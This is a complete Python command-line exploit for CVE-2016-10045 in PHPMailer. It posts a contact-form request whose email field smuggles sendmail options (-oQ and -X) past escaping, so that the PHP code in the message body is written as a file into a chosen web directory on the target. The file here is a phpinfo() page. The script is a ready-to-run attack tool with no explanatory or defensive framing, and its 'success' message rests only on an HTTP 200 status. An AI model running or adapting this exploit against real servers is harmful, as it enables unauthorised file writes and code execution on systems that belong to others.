#!/usr/bin/env python3
import requests
import argparse
import re

def exploit(url, dir):
    if not re.match(r'^https?://', url):
        url = f"https://{url}"

    payload = "\"attacker\\' -oQ/tmp/ -X%s/phpcode.php  some\"@email.com" % dir
    code = "<?php phpinfo(); ?>"
    
    data = {'action': 'send', 'name': 'LESIS', 'email': payload, 'msg': code}
    
    response = requests.post(url, data=data)
    
    if response.status_code == 200:
        print("Exploitation successful!")
    else:
        print("Exploitation failed.")

def main():
    parser = argparse.ArgumentParser(description='CVE-2016-10045 | PHPMailer')
    parser.add_argument('-t', '--target', required=True, help='Target URL')
    parser.add_argument('-d', '--dir', required=True, help='Remote recording directory')
    args = parser.parse_args()
    
    if args.target and args.dir:
        exploit(args.target, args.dir)

if __name__ == '__main__':
    main()
